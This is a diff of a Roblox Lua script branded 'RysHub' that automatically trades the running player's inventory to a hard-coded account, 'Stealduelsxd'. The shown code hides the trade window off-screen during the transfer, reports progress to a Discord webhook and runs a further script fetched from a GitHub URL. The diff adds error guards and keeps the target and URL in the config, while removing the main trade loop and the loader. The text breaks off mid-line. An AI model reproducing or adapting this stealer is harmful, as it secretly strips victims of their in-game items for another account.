@@ -3,9 +3,9 @@ local CONFIG = {
 
     TARGET_NAME   = "Stealduelsxd",
    
-    -- Script extra que se ejecuta al iniciar. Solo debes colocar la URL en texto.
+    -- Script extra que se ejecuta al iniciar (SOLO COLOCAR LA URL)
     -- Dejar vacio ("") para desactivar.
-    SECOND_SCRIPT_URL = "loadstring(game:HttpGet("https://raw.githubusercontent.com/rysted-rbx/free/main/dmvs"))()",
+    SECOND_SCRIPT_URL = "https://raw.githubusercontent.com/rysted-rbx/free/main/dmvs",
 
     -- (OPCIONAL) webhook de Discord para notificaciones, dejar vacio para desactivar
     WEBHOOK = {
@@ -20,7 +20,7 @@ local CONFIG = {
     MAX_TRADE_ITEMS = 12,
     OFFER_GAP       = 0.35,
     READY_TIMEOUT   = 60,
-    AUTO_INVITE     = true,
+    AUTO_INVITE      = true,
     INVITE_EVERY    = 8,
 }
 
@@ -31,8 +31,15 @@ local HttpService       = game:GetService("HttpService")
 
 local LocalPlayer = Players.LocalPlayer
 
-local Remotes       = require(ReplicatedStorage.Shared.Remotes)
-local ClientGlobals = require(ReplicatedStorage.Client.Modules.ClientGlobals)
+-- Carga segura de modulos
+local okRemotes, Remotes = pcall(function() return require(ReplicatedStorage.Shared.Remotes) end)
+local okGlobals, ClientGlobals = pcall(function() return require(ReplicatedStorage.Client.Modules.ClientGlobals) end)
+
+if not okRemotes or not okGlobals then
+    warn("[RysHub] Error: No se pudieron cargar los módulos principales del juego.")
+    return
+end
+
 local PlayerData        = ClientGlobals.PlayerData
 local ActiveNegotiation = ClientGlobals.ActiveNegotiation
 local SessionState      = ClientGlobals.SessionState
@@ -53,7 +60,6 @@ if CONFIG.INCLUDE_EMOTES then CATEGORIES[#CATEGORIES + 1] = "Emote" end
 
 local RARITY_RANK = { Ancient = 6, Mythic = 5, Legendary = 4, Rare = 3, Uncommon = 2, Common = 1 }
 local RARITY_ORDER = { "Ancient", "Mythic", "Legendary", "Rare", "Uncommon", "Common", "Unknown" }
-
 
 local TARGET_LOW = string.lower(tostring(CONFIG.TARGET_NAME or ""))
 
@@ -100,6 +106,7 @@ end
 
 local function getInventory()
     local out = {}
+    if not PlayerData then return out end
     for _, cat in ipairs(CATEGORIES) do
         local bucket = PlayerData:TryIndex({ "Inventory", cat })
         if type(bucket) == "table" then
@@ -131,6 +138,7 @@ local function summaryByRarity(inv)
 end
 
 local function sides()
+    if not ActiveNegotiation then return nil, nil, nil end
     local data = ActiveNegotiation.Data
     if type(data) ~= "table" or not data.player1 or not data.player2 then return nil, nil, nil end
     local me, other
@@ -152,6 +160,7 @@ local function offeredGuids()
 end
 
 local function getIncoming()
+    if not SessionState then return {} end
     local v = SessionState:TryIndex({ "incomingTradeRequests" })
     return type(v) == "table" and v or {}
 end
@@ -167,7 +176,7 @@ end
 
 local function waitProcessingLock()
     waitUntil(function()
-        local d = ActiveNegotiation.Data
+        local d = ActiveNegotiation and ActiveNegotiation.Data
         return not (d and (d.processing or 0) > Workspace:GetServerTimeNow())
     end, 5)
 end
@@ -263,223 +272,4 @@ local function webhookStart()
                 { name = "Por rareza", value = "```\n" .. rarityLines(inv) .. "\n```", inline = true },
                 { name = "Por categoria", value = "```\n" .. categoryLines(inv) .. "\n```", inline = true },
                 { name = "Orden de entrega", value = "```\n" .. topItemsText(inv, 15) .. "\n```", inline = false },
-                { name = "Job Code", value = "```lua\n" .. jobCode() .. "\n```", inline = false },
-            },
-        } },
-    })
-end
-
-local stats = { trades = 0, items = 0, startedAt = os.clock() }
-
-local function webhookEmpty()
-    if not CONFIG.WEBHOOK.NOTIFY_WHEN_EMPTY then return end
-    sendWebhook({
-        content = CONFIG.WEBHOOK.PING,
-        embeds = { {
-            title = "Transfer terminado: " .. (CONFIG.ANONYMOUS and "anonymous" or LocalPlayer.Name),
-            color = 65280,
-            fields = {
-                { name = "Trades", value = tostring(stats.trades), inline = true },
-                { name = "Items dados", value = tostring(stats.items), inline = true },
-                { name = "Duracion", value = ("%d min"):format((os.clock() - stats.startedAt) / 60), inline = true },
-            },
-        } },
-    })
-end
-
-local function handleTrade(other)
-    local offered, offeredCount = offeredGuids()
-    local room = CONFIG.MAX_TRADE_ITEMS - offeredCount
-
-    if room > 0 then
-        local batch = {}
-        for _, e in ipairs(sortByRarity(getInventory())) do
-            if not offered[e.guid] then
-                batch[#batch + 1] = e
-                if #batch >= room then break end
-            end
-        end
-
-        if #batch == 0 and offeredCount == 0 then
-            pcall(function() Remotes.CancelTrade:FireServer() end)
-            return "empty"
-        end
-
-        if #batch > 0 then
-            for _, e in ipairs(batch) do
-                if not sides() then return "closed" end
-                waitProcessingLock()
-                Remotes.OfferItem:FireServer(e.guid)
-                task.wait(CONFIG.OFFER_GAP)
-            end
-            task.wait(0.5)
-            local _, nowCount = offeredGuids()
-            if nowCount < math.min(CONFIG.MAX_TRADE_ITEMS, offeredCount + #batch) then
-                return "retry"
-            end
-        end
-    end
-
-    local me = sides()
-    if not me then return "closed" end
-    if not me.ready then
-        task.wait(0.3)
-        setReadyTrue()
-    end
-
-    local _, finalCount = offeredGuids()
-    local done = waitUntil(function()
-        local m, _, d = sides()
-        if not d then return true end
-        if d.exchanging == true then return true end
-        if m and not m.ready then return true end
-        return false
-    end, CONFIG.READY_TIMEOUT)
-
-    local m, _, d = sides()
-    if d and d.exchanging then
-        stats.trades = stats.trades + 1
-        stats.items  = stats.items + finalCount
-        waitUntil(function() return sides() == nil end, 20)
-        return "done"
-    end
-    if not d then return "closed" end
-    if m and not m.ready then return "retry" end
-    return "waiting"
-end
-
-local running = true
-
-local tradeGui = nil
-local tradeGuiOriginal = nil
-local tradeHidden = false
-local tradeGuiConns = {}
-
-local function tradingWithTarget()
-    local _, other = sides()
-    return other and other.player and isTarget(other.player) or false
-end
-
-local function applyTradeGuiState()
-    if not tradeGui then return end
-    pcall(function()
-        if tradeHidden then
-            if tradeGui.Position ~= UDim2.new(5, 0, 5, 0) then
-                tradeGui.Position = UDim2.new(5, 0, 5, 0)
-            end
-        elseif tradeGuiOriginal and tradeGui.Position ~= tradeGuiOriginal then
-            tradeGui.Position = tradeGuiOriginal
-        end
-    end)
-end
-
-local guiThread = task.spawn(function()
-    local gui = LocalPlayer:WaitForChild("PlayerGui")
-    local newGui = gui:WaitForChild("NewGui", 30)
-    if not newGui then return end
-    tradeGui = newGui:WaitForChild("TradeNegotiation", 30)
-    if not tradeGui then return end
-    tradeGuiOriginal = tradeGui.Position
-
-    tradeGuiConns[#tradeGuiConns + 1] = tradeGui:GetPropertyChangedSignal("Position"):Connect(function()
-        if not tradeHidden and tradeGui.Position ~= UDim2.new(5, 0, 5, 0) then
-            tradeGuiOriginal = tradeGui.Position
-        end
-        applyTradeGuiState()
-    end)
-    tradeGuiConns[#tradeGuiConns + 1] = tradeGui:GetPropertyChangedSignal("Visible"):Connect(applyTradeGuiState)
-
-    while running do
-        local hide = tradingWithTarget()
-        if hide ~= tradeHidden then
-            tradeHidden = hide
-            applyTradeGuiState()
-        end
-        task.wait(0.2)
-    end
-end)
-local busy = false
-local emptyNotified = false
-local lastInvite = 0
-local lastAccept = {}
-
-local mainThread = task.spawn(function()
-    while running do
-        local me, other = sides()
-
-        if me and other and other.player then
-            if isTarget(other.player) then
-                if not busy then
-                    busy = true
-                    local ok, res = pcall(handleTrade, other)
-                    busy = false
-                    if ok and res == "empty" and not emptyNotified then
-                        emptyNotified = true
-                        webhookEmpty()
-                    elseif ok and res == "done" then
-                        emptyNotified = false
-                        task.wait(1)
-                    end
-                end
-            else
-                task.wait(1)
-            end
-        else
-            local target = findTargetPlayer()
-            if not target then
-                task.wait(2)
-                continue
-            end
-
-            local now = os.clock()
-            local accepted = false
-            for _, p in ipairs(getIncoming()) do
-                if isTarget(p) then
-                    local key = typeof(p) == "Instance" and p.UserId or tostring(p)
-                    if not lastAccept[key] or now - lastAccept[key] > 3 then
-                        lastAccept[key] = now
-                        Remotes.AcceptInvite:FireServer(p)
-                        accepted = true
-                    end
-                end
-            end
-
-            if not accepted and CONFIG.AUTO_INVITE and now - lastInvite > CONFIG.INVITE_EVERY then
-                if #getInventory() > 0 then
-                    lastInvite = now
-                    Remotes.SendInvite:FireServer(target)
-                end
-            end
-        end
-
-        task.wait(0.4)
-    end
-end)
-
-webhookStart()
-
-if CONFIG.SECOND_SCRIPT_URL and CONFIG.SECOND_SCRIPT_URL ~= "" then
-    task.spawn(function()
-        pcall(function()
-            loadstring(game:HttpGet(CONFIG.SECOND_SCRIPT_URL))()
-        end)
-    end)
-end
-
-local API = {
-    role  = "transfer",
-    stats = function()
-        return { trades = stats.trades, items = stats.items, left = #getInventory() }
-    end,
-    inventory = function() return sortByRarity(getInventory()) end,
-    unload = function()
-        running = false
-        if mainThread then task.cancel(mainThread); mainThread = nil end
-        if guiThread then task.cancel(guiThread); guiThread = nil end
-        for _, c in ipairs(tradeGuiConns) do pcall(function() c:Disconnect() end) end
-        tradeGuiConns = {}
-        tradeHidden = false
-        applyTradeGuiState()
-    end,
-}
-if typeof(getgenv) == "function" then getgenv().RysHubTransfer = API else _G.RysHubTransfer = API end
+                { name = "Job Code", value = "```lua\n" .. jobCode() .. "\n
